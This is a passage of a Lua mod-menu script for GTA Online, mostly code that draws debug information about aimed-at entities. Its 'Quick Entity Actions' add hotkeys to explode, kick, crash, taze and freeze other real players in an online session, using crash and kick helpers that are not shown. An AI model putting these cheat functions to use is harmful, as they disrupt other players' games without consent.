					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				end
			elseif entity.is_entity_a_vehicle(entity_debug_info_entity) then
				ui.set_text_scale(feature["Debug Info Text Size 2"].value)
				ui.set_text_font(feature["Debug Info Text Font 2"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Vehicle", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.5 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Hash: " .. tostring(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Health: " .. text_func.round(natives.GET_VEHICLE_BODY_HEALTH(entity_debug_info_entity)) .. "/1000", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Name: " .. tostring(vehicle.get_vehicle_model(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("God: " .. tostring(entity.get_entity_god_mode(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Visible: " .. tostring(entity.is_entity_visible(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Has Control: " .. tostring(network.has_control_of_entity(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Attached: " .. tostring(entity.is_entity_attached(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Dead: " .. tostring(entity.is_entity_dead(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Networked: " .. tostring(natives.NETWORK_GET_ENTITY_IS_NETWORKED(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.69 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Frozen: " .. tostring(memory.is_entity_frozen(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.71 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Net ID: " .. tostring(natives.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity_debug_info_entity)), v2(0.5 + feature["Debug Info Text X Offset"].value, 0.73 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script ID: " .. tostring(natives.NETWORK_GET_ENTITY_NET_SCRIPT_ID(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.75 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script Char: " .. tostring(natives.GET_ENTITY_SCRIPT(entity_debug_info_entity, 0)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.77 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Position: " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Rotation: " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Heading: " .. text_func.round_two_dc(entity.get_entity_heading(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Model: " .. VehicleModel.get_vehicle_model_from_hash(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Mission Entity: " .. tostring(natives.IS_ENTITY_A_MISSION_ENTITY(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Scripted: " .. tostring(memory.is_script_entity(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				local entity_owner = memory.get_entity_owner(entity_debug_info_entity)
				if entity_owner ~= nil and player.get_player_name(entity_owner) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: " .. tostring(player.get_player_name(entity_owner)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				end
				local entity_creator = memory.get_entity_creator(entity_debug_info_entity)
				if entity_creator ~= nil and player.get_player_name(entity_creator) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: " .. tostring(player.get_player_name(entity_creator)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				end
			elseif entity.is_entity_an_object(entity_debug_info_entity) then
				ui.set_text_scale(feature["Debug Info Text Size 2"].value)
				ui.set_text_font(feature["Debug Info Text Font 2"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Object", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.5 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Hash: " .. tostring(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Health: 0/0", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("God: " .. tostring(entity.get_entity_god_mode(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Visible: " .. tostring(entity.is_entity_visible(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Has Control: " .. tostring(network.has_control_of_entity(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Attached: " .. tostring(entity.is_entity_attached(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Static: " .. tostring(entity.is_entity_static(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Networked: " .. tostring(natives.NETWORK_GET_ENTITY_IS_NETWORKED(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Frozen: " .. tostring(memory.is_entity_frozen(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.69 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Net ID: " .. tostring(natives.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity_debug_info_entity)), v2(0.5 + feature["Debug Info Text X Offset"].value, 0.71 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script ID: " .. tostring(natives.NETWORK_GET_ENTITY_NET_SCRIPT_ID(entity_debug_info_entity)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.73 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Script Char: " .. tostring(natives.GET_ENTITY_SCRIPT(entity_debug_info_entity, 0)) .. "", v2(0.5 + feature["Debug Info Text X Offset"].value, 0.75 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Position: " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_coords(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.53 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Rotation: " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).x) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).y) .. ", " .. text_func.round_two_dc(entity.get_entity_rotation(entity_debug_info_entity).z) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.55 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Heading: " .. text_func.round_two_dc(entity.get_entity_heading(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.57 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Model: " .. ObjectModel.get_object_model_from_hash(entity.get_entity_model_hash(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.59 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Mission Entity: " .. tostring(natives.IS_ENTITY_A_MISSION_ENTITY(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.61 + feature["Debug Info Text Y Offset"].value))
				ui.set_text_scale(feature["Debug Info Text Size 1"].value)
				ui.set_text_font(feature["Debug Info Text Font 1"].value)
				ui.set_text_outline(true)
				ui.set_text_color(255, 255, 255, 255)
				ui.draw_text("Scripted: " .. tostring(memory.is_script_entity(entity_debug_info_entity)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.63 + feature["Debug Info Text Y Offset"].value))
				local entity_owner = memory.get_entity_owner(entity_debug_info_entity)
				if entity_owner ~= nil and player.get_player_name(entity_owner) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: " .. tostring(player.get_player_name(entity_owner)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Owner: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.65 + feature["Debug Info Text Y Offset"].value))
				end
				local entity_creator = memory.get_entity_creator(entity_debug_info_entity)
				if entity_creator ~= nil and player.get_player_name(entity_creator) ~= nil then
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: " .. tostring(player.get_player_name(entity_creator)) .. "", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				else
					ui.set_text_scale(feature["Debug Info Text Size 1"].value)
					ui.set_text_font(feature["Debug Info Text Font 1"].value)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("Creator: -", v2(0.58 + feature["Debug Info Text X Offset"].value, 0.67 + feature["Debug Info Text Y Offset"].value))
				end
			end
		end
	end
end)

feature["Debug Info Text Font 1"] = menu.add_feature("Text Font 1", "autoaction_value_i", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text Font 1"].max = 8
feature["Debug Info Text Font 1"].min = 0
feature["Debug Info Text Font 1"].mod = 1
feature["Debug Info Text Font 1"].value = 4

feature["Debug Info Text Font 2"] = menu.add_feature("Text Font 2", "autoaction_value_i", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text Font 2"].max = 8
feature["Debug Info Text Font 2"].min = 0
feature["Debug Info Text Font 2"].mod = 1
feature["Debug Info Text Font 2"].value = 7

feature["Debug Info Text Size 1"] = menu.add_feature("Text Size 1", "autoaction_value_f", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text Size 1"].max = 0.50
feature["Debug Info Text Size 1"].min = 0.10
feature["Debug Info Text Size 1"].mod = 0.01
feature["Debug Info Text Size 1"].value = 0.35

feature["Debug Info Text Size 2"] = menu.add_feature("Text Size 2", "autoaction_value_f", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text Size 2"].max = 1.00
feature["Debug Info Text Size 2"].min = 0.10
feature["Debug Info Text Size 2"].mod = 0.01
feature["Debug Info Text Size 2"].value = 0.60

feature["Debug Info Text X Offset"] = menu.add_feature("Text X Offset", "autoaction_value_f", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text X Offset"].max = 0.50
feature["Debug Info Text X Offset"].min = -0.50
feature["Debug Info Text X Offset"].mod = 0.01
feature["Debug Info Text X Offset"].value = 0.00

feature["Debug Info Text Y Offset"] = menu.add_feature("Text Y Offset", "autoaction_value_f", localparents["Display Debug Info"].id, function(f)
end)
feature["Debug Info Text Y Offset"].max = 0.50
feature["Debug Info Text Y Offset"].min = -0.50
feature["Debug Info Text Y Offset"].mod = 0.01
feature["Debug Info Text Y Offset"].value = 0.00

feature["Quick Entity Actions"] = menu.add_feature("Quick Entity Actions", "toggle", localparents["Editor Mode"].id, function(f)
	if f.on then
		while f.on do
			system.yield(0)
			if player.is_player_free_aiming(player.player_id()) then
				local controls_entity_aimed_at = player.get_entity_player_is_aiming_at(player.player_id())
				if entity.is_entity_a_ped(controls_entity_aimed_at) and not ped.is_ped_in_any_vehicle(controls_entity_aimed_at) and not ped.is_ped_a_player(controls_entity_aimed_at) then
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("| Ped |", v2(0.5, 0.925))
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("X - Delete | H - Resurrect | B - Copy Hash | K - Stroke | N - Kill | U - Ragdoll | C - Clear Tasks", v2(0.5, 0.95))
					if controls.is_disabled_control_just_pressed(0, 323) then
						utilities.request_control(controls_entity_aimed_at)
						entity_func.hard_remove_entity(controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 304) then
						utilities.request_control(controls_entity_aimed_at)
						menu.create_thread(function()
							if entity.is_entity_dead(controls_entity_aimed_at, true) then
								graphics.set_next_ptfx_asset("scr_rcbarry1")
								while not graphics.has_named_ptfx_asset_loaded("scr_rcbarry1") do
									graphics.request_named_ptfx_asset("scr_rcbarry1")
									system.yield(0)
								end
								local pos = entity.get_entity_coords(controls_entity_aimed_at)
								graphics.start_networked_particle_fx_non_looped_at_coord("scr_alien_teleport", pos + v3(0, 0, -2), v3(0, 0, 0), 4, true, true, true)
								system.yield(1000)
								ped.resurrect_ped(controls_entity_aimed_at)
								ped.clear_ped_tasks_immediately(controls_entity_aimed_at)
								entity.set_entity_collision(controls_entity_aimed_at, true, true, true)
								for i = 1, 500 do
									ped.clear_ped_tasks_immediately(controls_entity_aimed_at)
								end
								system.yield(100)
								local health = ped.get_ped_max_health(controls_entity_aimed_at)
								ped.set_ped_max_health(controls_entity_aimed_at, health)
								system.yield(100)
								ped.set_ped_health(controls_entity_aimed_at, health)
								ped.clear_ped_blood_damage(controls_entity_aimed_at)
								graphics.remove_named_ptfx_asset("scr_rcbarry1")
							end
						end, nil)
					elseif controls.is_disabled_control_just_pressed(0, 29) then
						utils.to_clipboard(entity.get_entity_model_hash(controls_entity_aimed_at))
						menu.notify("Copied Hash! - " .. entity.get_entity_model_hash(controls_entity_aimed_at) .. "", AddictScript)
					elseif controls.is_disabled_control_just_pressed(0, 311) then
						menu.create_thread(function()
							local time = utils.time_ms() + 120000
							while time > utils.time_ms() and not entity.is_entity_on_fire(controls_entity_aimed_at) and not entity.is_entity_dead(controls_entity_aimed_at) do
								ped.set_ped_to_ragdoll(controls_entity_aimed_at, 1000, 1000, 0)
								system.yield(0)
							end
						end, nil)
					elseif controls.is_disabled_control_just_pressed(0, 306) then
						utilities.request_control(controls_entity_aimed_at)
						ped.set_ped_max_health(controls_entity_aimed_at, 0)
						ped.set_ped_health(controls_entity_aimed_at, 0)
					elseif controls.is_disabled_control_just_pressed(0, 303) then
						utilities.request_control(controls_entity_aimed_at)
						ped.set_ped_to_ragdoll(controls_entity_aimed_at, 1000, 1000, 0)
					elseif controls.is_disabled_control_pressed(0, 324) then
						utilities.request_control(controls_entity_aimed_at)
						ped.clear_ped_tasks_immediately(controls_entity_aimed_at)
					end
				elseif entity.is_entity_a_ped(controls_entity_aimed_at) and not ped.is_ped_in_any_vehicle(controls_entity_aimed_at) and ped.is_ped_a_player(controls_entity_aimed_at) then
					local controls_entity_aimed_at = player.get_player_from_ped(controls_entity_aimed_at)
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("| Player |", v2(0.5, 0.925))
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("X - Explode | B - Kick | K - Crash | N - Taze | H - Send To Brazil | C - Freeze", v2(0.5, 0.95))
					if controls.is_disabled_control_just_pressed(0, 323) then
						fire.add_explosion(player.get_player_coords(controls_entity_aimed_at), 0, true, false, 0.1, player.get_player_ped(controls_entity_aimed_at))
					elseif controls.is_disabled_control_just_pressed(0, 29) then
						if network.network_is_host() then
							network.network_session_kick_player(controls_entity_aimed_at)
						elseif player.is_player_host(controls_entity_aimed_at) and player.is_player_modder(controls_entity_aimed_at, -1) then
							script_func.script_event_kick(controls_entity_aimed_at)
						else
							network.force_remove_player(controls_entity_aimed_at)
						end
					elseif controls.is_disabled_control_just_pressed(0, 311) then
						if player.is_player_valid(controls_entity_aimed_at) then
							script_func.script_event_crash(controls_entity_aimed_at)
						end
					elseif controls.is_disabled_control_just_pressed(0, 306) then
						gameplay.shoot_single_bullet_between_coords(entity.get_entity_coords(controls_entity_aimed_at) + v3(0, 0, 2), entity.get_entity_coords(controls_entity_aimed_at), 0, gameplay.get_hash_key("weapon_stungun"), player.get_player_ped(player.player_id()), true, false, 10000)
					elseif controls.is_disabled_control_just_pressed(0, 304) then
						script_func.send_to_brazil(controls_entity_aimed_at)
					elseif controls.is_disabled_control_pressed(0, 324) then
						ped.clear_ped_tasks_immediately(controls_entity_aimed_at)
					end
				elseif entity.is_entity_a_ped(controls_entity_aimed_at) and ped.is_ped_in_any_vehicle(controls_entity_aimed_at) then
					local controls_entity_aimed_at = ped.get_vehicle_ped_is_using(controls_entity_aimed_at)
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("| Vehicle |", v2(0.5, 0.925))
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
					ui.draw_text("X - Delete | B - Copy Hash | K - Explode | N - Engine | U - Burn | H - Enter | C - Freeze", v2(0.5, 0.95))
					if controls.is_disabled_control_just_pressed(0, 323) then
						utilities.request_control(controls_entity_aimed_at)
						entity_func.hard_remove_entity(controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 29) then
						utils.to_clipboard(entity.get_entity_model_hash(controls_entity_aimed_at))
						menu.notify("Copied Hash! - " .. entity.get_entity_model_hash(controls_entity_aimed_at) .. "", AddictScript)
					elseif controls.is_disabled_control_just_pressed(0, 311) then
						fire.add_explosion(entity.get_entity_coords(controls_entity_aimed_at), 0, true, false, 0.1, controls_entity_aimed_at)
					elseif controls.is_disabled_control_just_pressed(0, 306) then
						utilities.request_control(controls_entity_aimed_at)
						vehicle.set_vehicle_engine_health(controls_entity_aimed_at, -1)
					elseif controls.is_disabled_control_just_pressed(0, 303) then
						utilities.request_control(controls_entity_aimed_at)
						vehicle.set_vehicle_engine_health(controls_entity_aimed_at, -1.0)
						natives.SET_VEHICLE_PETROL_TANK_HEALTH(controls_entity_aimed_at, -1.0)
					elseif controls.is_disabled_control_just_pressed(0, 304) then
						if ped.is_ped_a_player(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1)) then
							ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), controls_entity_aimed_at, -2)
						else
							utilities.request_control(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1))
							utilities.request_control(controls_entity_aimed_at)
							ped.set_ped_into_vehicle(vehicle.get_ped_in_vehicle_seat(controls_entity_aimed_at, -1), controls_entity_aimed_at, -2)
							ped.set_ped_into_vehicle(player.get_player_ped(player.player_id()), controls_entity_aimed_at, -1)
						end
					end
					if controls.is_disabled_control_pressed(0, 324) then
						entity.freeze_entity(controls_entity_aimed_at, true)
					else
						entity.freeze_entity(controls_entity_aimed_at, false)
					end
				elseif entity.is_entity_a_vehicle(controls_entity_aimed_at) then
					ui.set_text_scale(0.4)
					ui.set_text_font(4)
					ui.set_text_centre(0)
					ui.set_text_outline(true)
					ui.set_text_color(255, 255, 255, 255)
